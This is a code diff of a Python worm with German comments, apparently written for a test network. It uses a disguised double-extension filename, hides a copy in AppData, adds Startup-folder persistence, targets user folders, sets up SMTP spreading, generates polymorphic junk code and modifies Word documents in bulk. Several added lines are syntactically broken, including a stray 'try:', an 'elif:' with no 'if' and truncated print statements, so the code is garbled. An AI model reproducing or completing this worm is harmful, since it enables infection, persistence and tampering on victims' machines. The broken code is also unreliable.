@@ -20,19 +20,23 @@ WORM_NAME = "Urlaub2024.jpg.exe"
 HIDDEN_PATH = os.path.expanduser("~\\AppData\\Local\\Microsoft\\")
 HIDDEN_FILE = os.path.join(HIDDEN_PATH, WORM_NAME)
 
-
+try:
 
 TARGET_DIRS = [
     os.path.expanduser("~\\Desktop"),
     os.path.expanduser("~\\Documents"),
-    os.path.expanduser("~\\Downloads")
+    os.path.expanduser("~\\Downloads"),
+    
 ]
+elif: 
+    os.path.expanduser("~\\Pictures")
+
 
 AUTOSTART_PATH = os.path.expanduser(
-    "~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + WORM_NAME)
-WORM_NAME = "WurmTest.exe"
-SMTP_SERVER = "192.168.1.100"  # Ersetze mit IP des Test-Mailservers
-SMTP_PORT = 25  # Port für unverschlüsseltes SMTP
+    "~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
+WORM_NAME = "womp womp.exe"
+SMTP_SERVER = "192.168.1.100"  
+SMTP_PORT = 25  
 SENDER_EMAIL = "infiziert@testnetz.local"
 RECIPIENT_EMAIL = "opfer@testnetz.local"
 
@@ -50,13 +54,13 @@ worm_name = f"winupdate_{rnd1}.py"
 junk_code = f"""
 def fake_function_{rnd1}():
     var_{rnd1} = {random.randint(1, 100)}
-    print("Nur ein harmloses Skript...", var_{rnd1})
+    var_{rnd1})
 """
 
 
 payload_code = f"""
 def real_payload_{rnd1}():
-    print("Ich bin ein Netzwerk- & USB-Wurm! Version {rnd1}")
+     Version {rnd1}")
 """
 
 code_blocks = [junk_code, payload_code]
@@ -223,7 +227,7 @@ def infect_word_docs():
                 file_path = os.path.join(folder, file)
                 try:
                     doc = word.Documents.Open(file_path)
-                    doc.Content.InsertAfter("\n\n👀 PhantomByte war hier! 👀")
+                    doc.Content.InsertAfter("\n\n PhantomByte war hier!")
                     doc.Save()
                     doc.Close()
                     print(f: {file_path}
